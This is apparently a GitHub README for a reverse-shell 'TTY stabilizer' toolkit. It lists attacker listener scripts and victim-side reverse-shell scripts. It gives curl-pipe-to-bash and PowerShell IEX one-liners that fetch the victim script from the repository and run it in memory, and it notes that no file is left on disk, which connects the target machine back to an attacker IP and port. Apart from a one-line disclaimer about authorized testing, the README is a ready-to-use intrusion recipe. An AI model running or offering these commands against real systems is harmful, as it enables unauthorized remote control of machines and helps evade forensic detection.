
# 🚀 TTY Shell Stabilizer Toolkit
A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY.
## 📂 Scripts

| Script | Role | Method |
|---|---|---|
| python_tty.sh | Attacker | Interactive listener using Python pty. |
| bash_tty.sh | Attacker | Interactive listener using script command. |
| victim.sh | Victim | Bash-based reverse shell. |

------------------------------
## 🛠 Usage Instructions
To use these scripts, follow the parameter formats below:
## 1. Attacker Side (Listeners)
Run the script followed by the desired port. If you do not specify a port, the script will show you the usage guide.
Python Version:
```bash
./python_tty.sh <port>
```
Bash Version:
```bash
./bash_tty.sh <port>
```
------------------------------
## 2. Victim Side (Connection)
On the target machine, provide both the attacker's IP and the listening port.
```bash
./victim.sh <attacker_ip> <port>
```
```powershell
.\windows_victim.ps1 <attacker_ip> <port>

```
------------------------------
## 💡 Quick Tips
## Execution via Remote Pipe (Attacker)

Option A: Python Interactive Listener
```bash
curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/python_tty.sh | bash -s -- 4444
```

Option B: Bash/Script Interactive Listener
```bash
curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh | bash -s -- 4444
```

## Execution via Remote Pipe (Victim)
If you cannot upload the script to the target machine, you can fetch it directly from this repository and execute it in memory without leaving a file on disk:
```bash
curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh | bash -s -- 10.0.13.7 4444
```
```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/windows_victim.ps1'); & {windows_victim 10.0.13.7 4444}"

```
## ⚠️ Recovery
If the session ends and your terminal stops displaying your typing, type reset and press Enter to restore your local environment.
```bash
reset
```
+ENTER
------------------------------
Disclaimer: For authorized security testing and administrative purposes only. !!!!!!!
------------------------------
